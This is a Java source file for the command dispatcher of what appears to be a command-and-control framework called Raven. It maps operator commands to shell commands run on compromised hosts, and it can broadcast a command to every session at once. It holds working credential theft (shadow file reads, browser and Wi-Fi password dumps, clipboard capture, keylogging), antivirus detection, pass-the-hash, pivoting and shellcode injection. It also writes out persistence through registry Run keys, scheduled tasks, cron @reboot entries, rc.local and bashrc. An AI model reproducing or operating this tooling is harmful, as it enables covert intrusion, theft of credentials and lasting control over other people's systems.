package com.raven.core.command;

import com.raven.core.database.TeamDatabase;
import com.raven.core.output.Logger;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import java.util.List;
import java.util.Map;
import java.util.Optional;

public final class AgentCommandDispatcher {

    public record CommandResult(boolean Success, String Output, String Command) {}

    private final RavenServer Server;
    private final TeamDatabase Database;
    private final String Operator;

    public AgentCommandDispatcher(RavenServer Server, TeamDatabase Database, String Operator) {
        this.Server = Server;
        this.Database = Database;
        this.Operator = Operator;
    }

    public CommandResult Dispatch(int SessionId, String UserCommand) {
        if (Server == null || !Server.IsRunning()) return new CommandResult(false, "server not running", UserCommand);

        Optional<Session> SessionOpt = Server.GetSessions().Get(SessionId);
        if (SessionOpt.isEmpty()) return new CommandResult(false, "session-" + SessionId + " not found", UserCommand);

        Session ActiveSession = SessionOpt.get();
        String OperatingSystem = ActiveSession.GetOs() != null ? ActiveSession.GetOs().toLowerCase() : "";
        boolean IsWindows = OperatingSystem.contains("win");
        boolean IsLinux = !IsWindows;

        String[] Parts = UserCommand.trim().split("\\s+", 2);
        String Command = Parts[0].toLowerCase();
        String Arguments = Parts.length > 1 ? Parts[1] : "";

        String AgentCommand = Translate(Command, Arguments, IsWindows, IsLinux, ActiveSession);

        if (AgentCommand == null) return new CommandResult(false, "[!] Command '" + Command + "' is not supported on " + (IsWindows ? "Windows" : "Linux"), UserCommand);

        CommandResult Result = Execute(SessionId, AgentCommand);
        Database.SaveCommandLog(SessionId, Operator, UserCommand, Result.Output(), Result.Success());
        return Result;
    }

    public Map<Integer, CommandResult> BroadcastDispatch(List<Integer> SessionIds, String UserCommand) {
        Map<Integer, CommandResult> Results = new java.util.LinkedHashMap<>();
        for (int SessionId : SessionIds) Results.put(SessionId, Dispatch(SessionId, UserCommand));
        return Results;
    }

    public Map<Integer, CommandResult> BroadcastAllDispatch(String UserCommand) {
        Map<Integer, CommandResult> Results = new java.util.LinkedHashMap<>();
        for (Session ActiveSession : Server.GetSessions().GetAll()) Results.put(ActiveSession.GetId(), Dispatch(ActiveSession.GetId(), UserCommand));
        return Results;
    }

    private CommandResult Execute(int SessionId, String AgentCommand) {
        String[] RawResult = Server.ExecuteCommand(SessionId, AgentCommand);
        boolean Success = Boolean.parseBoolean(RawResult[0]);
        return new CommandResult(Success, RawResult[1], AgentCommand);
    }

    private String Translate(String Command, String Arguments, boolean IsWindows, boolean IsLinux, Session ActiveSession) {
        return switch (Command) {
            // ── SESSION CONTROL ────────────────────────────────────────────
            case "exec" -> Arguments;
            case "shell" -> IsWindows ? "cmd /c " + Arguments : "sh -c " + Arguments;
            case "reconnect" -> "raven:reconnect";
            case "self-destruct" -> "raven:selfdestruct";
            case "sleep" -> "raven:sleep " + Arguments;
            case "jitter" -> "raven:jitter " + Arguments;
            case "ping" -> "raven:ping";
            case "screenshot" -> "raven:screenshot";
            case "spawn" -> "raven:spawn";
            case "migrate" -> "raven:migrate " + Arguments;
            // ── RECON — cross-platform ─────────────────────────────────────
            case "whoami" -> IsWindows ? "whoami /all" : "whoami";
            case "hostname" -> "hostname";
            case "id" -> IsLinux ? "id" : null;
            case "uname" -> IsLinux ? "uname -a" : null;
            case "systeminfo" -> IsWindows ? "systeminfo" : null;
            case "ps" -> IsWindows ? "tasklist /v" : "ps aux --sort=-%cpu";
            case "tasklist" -> IsWindows ? "tasklist /v" : null;
            case "env" -> IsWindows ? "set" : "env";
            case "set" -> IsWindows ? "set" : null;
            case "ifconfig" -> IsLinux ? "(ifconfig 2>/dev/null || ip addr show)" : null;
            case "ipconfig" -> IsWindows ? "ipconfig /all" : null;
            case "netstat" -> IsWindows ? "netstat -an" : "ss -tulpn 2>/dev/null || netstat -tulpn";
            case "arp" -> IsWindows ? "arp -a" : "arp -n";
            case "route" -> IsWindows ? "route print" : "ip route";
            case "users" -> IsWindows ? "net user" : "cat /etc/passwd | cut -d: -f1,3,6,7";
            case "groups" -> IsWindows ? "net localgroup" : "cat /etc/group";
            case "localadmins" -> IsWindows ? "net localgroup administrators" : null;
            case "domaininfo" -> IsWindows ? "net user /domain 2>&1 & whoami /groups" : null;
            case "crontab" -> IsLinux ? "crontab -l 2>/dev/null; cat /etc/cron* /etc/cron.d/* 2>/dev/null" : null;
            case "schtasks" -> IsWindows ? "schtasks /query /fo LIST /v" : null;
            case "services" -> IsWindows ? "sc query state= all" : "systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null";
            case "antivirus" -> IsWindows ? "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayName 2>&1" : "ps aux | grep -iE 'clamav|sophos|eset|avast|bitdefender|trend|cylance|falcon|sentinel'";
            case "privcheck" -> IsWindows ? "whoami /priv && net localgroup administrators 2>&1" : "id; sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null";
            case "clipboard" -> IsWindows ? "powershell -command \"Get-Clipboard\"" : "(xclip -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null)";
            case "keystroke" -> Arguments.equalsIgnoreCase("on") ? "raven:keylog start" : Arguments.equalsIgnoreCase("off") ? "raven:keylog stop" : null;
            case "searchfiles" -> IsWindows ? "where /r C:\\ " + Arguments + " 2>&1" : "find / -name \"" + Arguments + "\" 2>/dev/null";
            case "hashdump" -> IsWindows ? "raven:hashdump" : "cat /etc/shadow 2>/dev/null || unshadow /etc/passwd /etc/shadow 2>/dev/null";
            case "dumpbrowsers" -> "raven:browserdump";
            case "wifidump" -> IsWindows ? "netsh wlan show profile name=* key=clear 2>&1" : "nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null";
            case "lastlog" -> IsLinux ? "lastlog; last -n 20" : null;
            case "osquery" -> "osqueryi --line \"" + Arguments + "\"";
            // ── FILESYSTEM ─────────────────────────────────────────────────
            case "ls" -> IsWindows ? "dir " + (Arguments.isBlank() ? "" : "\"" + Arguments + "\"") : "ls -la " + (Arguments.isBlank() ? "." : "\"" + Arguments + "\"");
            case "dir" -> IsWindows ? "dir " + (Arguments.isBlank() ? "" : "\"" + Arguments + "\"") : null;
            case "pwd" -> IsWindows ? "cd" : "pwd";
            case "cd" -> IsWindows ? "cd /d \"" + Arguments + "\"" : "cd \"" + Arguments + "\"";
            case "cat" -> IsWindows ? "type \"" + Arguments + "\"" : "cat \"" + Arguments + "\"";
            case "type" -> IsWindows ? "type \"" + Arguments + "\"" : null;
            case "head" -> {
                if (IsWindows) yield null;
                String[] HeadParts = Arguments.split("\\s+", 2);
                yield HeadParts.length > 1 ? "head -n " + HeadParts[1] + " \"" + HeadParts[0] + "\"" : "head -n 20 \"" + Arguments + "\"";
            }
            case "tail" -> {
                if (IsWindows) yield null;
                String[] TailParts = Arguments.split("\\s+", 2);
                yield TailParts.length > 1 ? "tail -n " + TailParts[1] + " \"" + TailParts[0] + "\"" : "tail -n 20 \"" + Arguments + "\"";
            }
            case "rm" -> IsWindows ? "del /f /q \"" + Arguments + "\" 2>&1 || rmdir /s /q \"" + Arguments + "\" 2>&1" : "rm -rf \"" + Arguments + "\"";
            case "del" -> IsWindows ? "del /f /q \"" + Arguments + "\"" : null;
            case "mkdir" -> IsWindows ? "mkdir \"" + Arguments + "\"" : "mkdir -p \"" + Arguments + "\"";
            case "cp" -> {
                String[] CopyParts = Arguments.split("\\s+", 2);
                if (CopyParts.length < 2) yield null;
                yield IsWindows ? "copy \"" + CopyParts[0] + "\" \"" + CopyParts[1] + "\"" : "cp -r \"" + CopyParts[0] + "\" \"" + CopyParts[1] + "\"";
            }
            case "mv" -> {
                String[] MoveParts = Arguments.split("\\s+", 2);
                if (MoveParts.length < 2) yield null;
                yield IsWindows ? "move \"" + MoveParts[0] + "\" \"" + MoveParts[1] + "\"" : "mv \"" + MoveParts[0] + "\" \"" + MoveParts[1] + "\"";
            }
            case "chmod" -> IsLinux ? "chmod " + Arguments : null;
            case "chown" -> IsLinux ? "chown " + Arguments : null;
            case "find" -> {
                String[] FindParts = Arguments.split("\\s+", 2);
                if (FindParts.length < 2) yield IsWindows ? "where /r . \"" + Arguments + "\"" : "find . -name \"" + Arguments + "\" 2>/dev/null";
                yield IsWindows ? "where /r \"" + FindParts[0] + "\" \"" + FindParts[1] + "\"" : "find \"" + FindParts[0] + "\" -name \"" + FindParts[1] + "\" 2>/dev/null";
            }
            case "grep" -> {
                String[] GrepParts = Arguments.split("\\s+", 2);
                if (GrepParts.length < 2) yield null;
                yield IsWindows ? "findstr /i \"" + GrepParts[0] + "\" \"" + GrepParts[1] + "\"" : "grep -n \"" + GrepParts[0] + "\" \"" + GrepParts[1] + "\"";
            }
            case "hash" -> IsWindows ? "certutil -hashfile \"" + Arguments + "\" SHA256" : "sha256sum \"" + Arguments + "\"";
            case "download" -> "raven:download " + Arguments;
            case "upload" -> "raven:upload " + Arguments;
            // ── LATERAL MOVEMENT ───────────────────────────────────────────
            case "pivot" -> "raven:pivot " + Arguments;
            case "portfwd" -> "raven:portfwd " + Arguments;
            case "socks" -> "raven:socks " + Arguments;
            case "shellcode" -> "raven:shellcode " + Arguments;
            case "persist" -> BuildPersist(Arguments, IsWindows, IsLinux);
            case "unpersist" -> "raven:unpersist " + Arguments;
            case "runas" -> {
                String[] RunAsParts = Arguments.split("\\s+", 3);
                if (RunAsParts.length < 3) yield null;
                yield IsWindows ? "runas /user:" + RunAsParts[0] + " \"" + RunAsParts[2] + "\"" : "echo '" + RunAsParts[1] + "' | su - " + RunAsParts[0] + " -c '" + RunAsParts[2] + "'";
            }
            case "pth" -> IsWindows ? "raven:pth " + Arguments : null;
            default -> Arguments.isBlank() ? Command : Command + " " + Arguments;
        };
    }

    private String BuildPersist(String Arguments, boolean IsWindows, boolean IsLinux) {
        String Method = Arguments.isBlank() ? "auto" : Arguments.toLowerCase();
        if (IsWindows) {
            return switch (Method) {
                case "registry" -> "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RavenAgent /t REG_SZ /d \"%APPDATA%\\agent.exe\" /f";
                case "schtask" -> "schtasks /create /tn RavenAgent /tr \"%APPDATA%\\agent.exe\" /sc onlogon /f";
                case "startup" -> "copy agent.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"";
                default -> "raven:persist auto";
            };
        }
        if (IsLinux) {
            return switch (Method) {
                case "cron" -> "(crontab -l 2>/dev/null; echo \"@reboot ~/.raven/agent\") | crontab -";
                case "rc.local" -> "echo '~/.raven/agent &' | sudo tee -a /etc/rc.local";
                case "systemd" -> "raven:persist systemd";
                case "bashrc" -> "echo '~/.raven/agent &' >> ~/.bashrc";
                default -> "raven:persist auto";
            };
        }
        return "raven:persist auto";
    }
}
